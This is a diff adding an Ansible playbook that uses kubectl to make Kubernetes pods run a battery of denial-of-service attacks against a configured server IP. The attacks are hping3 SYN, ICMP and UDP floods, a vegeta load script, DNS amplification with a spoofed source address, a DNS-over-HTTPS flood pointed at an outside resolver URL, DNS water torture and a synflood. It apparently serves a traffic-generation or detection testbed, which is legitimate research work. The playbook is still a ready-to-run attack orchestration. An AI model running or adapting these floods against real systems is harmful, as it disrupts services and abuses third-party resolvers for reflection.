@@ -1,0 +1,95 @@
+---
+- name: Execute task in pods
+  hosts: localhost
+  gather_facts: no
+  vars:
+    cgclients: []
+    ddosclients: []
+
+  tasks:
+#--------------------------------------Configuration------------------------------------------------------------------------------------
+    - name: Include client counts
+      include_vars:
+        file: "{{ playbook_dir }}/../clients_number.yaml"
+  
+    - name: Crear cgclients
+      set_fact:
+        cgclients: "{{ cgclients + [{'name': 'cgclient' ~ item, 'pod': 'cgclient' ~ item}] }}"
+      loop: "{{ range(1, cg_count + 1)|list }}"
+    
+    - name: Crear ddosclients
+      set_fact:
+        ddosclients: "{{ ddosclients + [{'name': 'ddosclient' ~ item, 'pod': 'ddosclient' ~ item}] }}"
+      loop: "{{ range(1, ddos_count + 1)|list }}"
+    
+    - name: Include server IPs
+      include_vars:
+        file: "{{ playbook_dir }}/../server_ips.yaml"
+
+    - name: Debug loaded server IPs
+      debug:
+        var: ddosserver_ip
+
+    - name: Debug loaded server IPs
+      debug:
+        var: cgserver_ip
+
+
+
+#---------------------------------Tasks execution---------------------------------------------------------------------------------------
+    # Cglient:
+
+    # ddosclient:
+    - name: Execute hping TCP
+      shell: kubectl exec -n ddos ddosclient1 -- env ddosserver={{ ddosserver_ip }} /bin/bash -c 'sudo timeout 660 hping3 -d 1200 -S $ddosserver -p 43 --flood'
+      async: 3600 
+      poll: 0
+
+    - name: Execute hping IP
+      shell: kubectl exec -n ddos ddosclient2 -- env ddosserver={{ ddosserver_ip }} /bin/bash -c 'sudo timeout 660 hping3 -0 -d 1200 -S $ddosserver --flood'
+      async: 3600 
+      poll: 0
+
+    - name: Execute hping ICMP
+      shell: kubectl exec -n ddos ddosclient3 -- env ddosserver={{ ddosserver_ip }} /bin/bash -c 'sudo timeout 660 hping3 -1 -d 1200 -S $ddosserver --flood'
+      async: 3600 
+      poll: 0
+
+    - name: Execute hping UDP
+      shell: kubectl exec -n ddos ddosclient4 -- env ddosserver={{ ddosserver_ip }} /bin/bash -c 'sudo timeout 660 hping3 -2 -d 1200 -S $ddosserver -p 80 --flood'
+      async: 3600 
+      poll: 0
+
+    - name: Execute vegeta.sh
+      shell: kubectl exec -n ddos ddosclient5 -- env ddosserver={{ ddosserver_ip }} ./vegeta.sh 660
+      async: 3600 
+      poll: 0
+
+    - name: Execute dns-amp
+      shell: kubectl exec -n ddos ddosclient6 -- env ddosserver={{ ddosserver_ip }} cgserver={{ cgserver_ip }} /bin/bash -c './dns_amp/dns-amp $ddosserver -f domain.txt -t ANY -p 53 -s $cgserver -S -d 660'
+      async: 3600 
+      poll: 0
+
+    - name: Start dnscrypt for DOH
+      shell: kubectl exec -n ddos ddosclient7 -- ./dnscrypt-proxy-linux_x86_64-2.1.5/config.sh
+    - name: Execute doh flood
+      shell: kubectl exec -n ddos ddosclient7 -- timeout 660 python3 cne-DoH-master/floodoh.py 30000 www.example.com A https://micaddy.com/dns-query
+      async: 3600 
+      poll: 0
+
+    - name: Execute watertorture
+      shell: kubectl exec -n ddos ddosclient8 -- env ddosserver={{ ddosserver_ip }} cgserver={{ cgserver_ip }} /bin/bash -c './dns-flood/dnsflood example.com $ddosserver -s $cgserver -p 53 -R -S -d 660'
+      async: 3600 
+      poll: 0
+
+    - name: Execute synflood
+      shell: kubectl exec -n ddos ddosclient9 -- env ddosserver={{ ddosserver_ip }} /bin/bash -c 'timeout 660 ./synflood-master/build/bin/synflood $ddosserver 80 -i eth1'
+      async: 3600 
+      poll: 0
+
+    
+
+    - name: Wait for 11 minutes
+      pause:
+        seconds: 660
+
